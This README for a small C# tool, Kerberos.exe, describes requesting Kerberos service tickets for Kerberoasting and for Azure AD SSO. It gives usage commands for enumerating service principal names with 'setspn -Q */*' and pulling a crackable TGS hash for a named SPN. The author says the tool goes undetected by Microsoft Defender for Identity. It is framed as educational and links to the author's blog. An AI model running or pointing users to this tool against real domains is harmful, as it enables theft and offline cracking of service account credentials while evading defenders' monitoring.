# Kerberos

I have created a small C# project that requests a Ticket Granting Service (TGS) ticket using KerberosSecurityTokenProvider to use for Kerberoasting and an option to request an Azure AD SSO TGS. For more information about these attacks, see the links below.

I started the project for educational purposes only, but the tool works fine **and is not detected by Microsoft Defender for Identity** (tested with release 2.133 of Microsoft Defender for Identity).

For more information about Kerberoasting, please check my blog post:  
https://thalpius.com/2020/11/30/microsoft-defender-for-identity-kerberoasting/

For more information about Azure AD SSO, please check my blog post:  
**COMING SOON**

# Usage Kerberoast

First search for an account with a service principal name you want to Kerberoast:  
```setspn -Q */*```

Once you've found an SPN, use it as a parameter to get the TGS hash which you can use to crack:  
```Kerberos.exe /kerberoast:MSSQLSERVER/SQL-Server.thalpius.demo:1433```

# Usage Azure AD SSO

Request a TGS for Azure AD SSO using the following command:  
```Kerberos.exe /azureadsso```

# Screenshots

Getting all Service Principal Names within the domain:  

![Alt text](/Screenshots/Kerberoasting01.jpg?raw=true "Kerberoast")

Using Kerberoasting.exe to get the Ticket Granting Service ticket to Kerberoast:  

![Alt text](/Screenshots/Kerberoasting02.jpg?raw=true "Azure AD SSO")
